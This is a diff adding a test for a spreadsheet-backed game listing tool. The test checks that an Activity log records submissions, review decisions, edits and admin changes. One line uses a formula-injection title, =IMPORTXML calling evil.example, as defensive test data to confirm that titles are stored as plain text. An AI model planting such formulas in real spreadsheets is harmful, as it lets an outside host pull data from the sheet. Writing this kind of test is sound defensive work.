@@ -310,6 +310,52 @@ test("an admin can mark a game full and reopen it: only approved games go live-c
   assert.ok(!JSON.stringify(data()).includes("Full\""), "no column names leak, only the flag");
 });
 
+test("the Activity tab records each change to a listing and who made it; a title can never run as a formula", () => {
+  const { store, deps } = fixture();
+  const logs = store.logs;
+  const last = () => logs.at(-1)!;
+  const [WHEN, WHAT, KIND, ID, TITLE, DETAIL, BY] = [0, 1, 2, 3, 4, 5, 6];
+
+  ctx.sync_(store, deps.now());
+  assert.deepEqual(logs.map((l) => l[WHAT]), ["new submission", "new submission"]);
+  assert.deepEqual([logs[0][KIND], logs[0][TITLE], logs[0][BY]], ["game", "Mercusuar di Pulau Kabut", "script"]);
+  assert.match(logs[0][WHEN], /^2026-10-05T00:00:00\.000Z$/);
+
+  const gameId = plain(ctx.loadRecords_(store, "game"))[0].id;
+  call(deps, { action: "review", token: "owner", kind: "game", status: "approved", ids: [gameId] });
+  assert.deepEqual([last()[WHAT], last()[ID], last()[DETAIL], last()[BY]], ["decision", gameId, "pending → approved", "owner@example.com"]);
+  call(deps, { action: "review", token: "owner", kind: "game", status: "rejected", reason: "Wrong date", ids: [gameId] });
+  assert.equal(last()[DETAIL], "approved → rejected: Wrong date");
+
+  call(deps, { action: "patch", token: "owner", kind: "game", id: gameId, full: true });
+  assert.deepEqual([last()[WHAT], last()[DETAIL]], ["changed", "Full → yes"]);
+
+  call(deps, { action: "admin.add", token: "owner", email: "new@example.com" });
+  assert.deepEqual([last()[WHAT], last()[DETAIL], last()[BY]], ["admin added", "new@example.com", "owner@example.com"]);
+  call(deps, { action: "admin.remove", token: "owner", email: "new@example.com" });
+  assert.equal(last()[WHAT], "admin removed");
+
+  // the GM edits an approved response: the script sends it back and says so
+  call(deps, { action: "review", token: "owner", kind: "game", status: "approved", ids: [gameId] });
+  store.update("game", 2, { "Game title": "A new title" });
+  ctx.sync_(store, deps.now());
+  assert.deepEqual([last()[WHAT], last()[DETAIL], last()[BY]], ["edited by the GM: back to review", "was approved", "script"]);
+
+  // a change that happens with no line here was made by hand: nothing here to say otherwise
+  const before = logs.length;
+  store.update("game", 2, { Status: "rejected" });
+  assert.equal(logs.length, before, "a hand edit in the Sheet leaves no line");
+
+  // a title that starts with = would run as a formula in the sheet: it is stored as plain text
+  const evil = makeStore([makeRow("game", 2, { ...GAME_FORM, title: "=IMPORTXML(\"https://evil.example\")" })], [makeRow("gm", 2, GM_FORM)]);
+  ctx.sync_(evil, deps.now());
+  assert.equal(evil.logs[0][TITLE], "'=IMPORTXML(\"https://evil.example\")");
+
+  // and a failing log never breaks the work it describes
+  const broken = { ...makeStore([makeRow("game", 2, GAME_FORM)], [makeRow("gm", 2, GM_FORM)]), log: () => { throw new Error("quota"); } };
+  assert.equal(plain(ctx.sync_(broken, deps.now())).newPending.length, 2);
+});
+
 test("approving by hand in the Sheet counts as live too, and a replaced profile keeps its old address", () => {
   const byHand = makeStore([makeRow("game", 2, GAME_FORM)], [makeRow("gm", 2, GM_FORM)]);
   ctx.sync_(byHand, Date.parse("2026-10-05T00:00:00Z"));
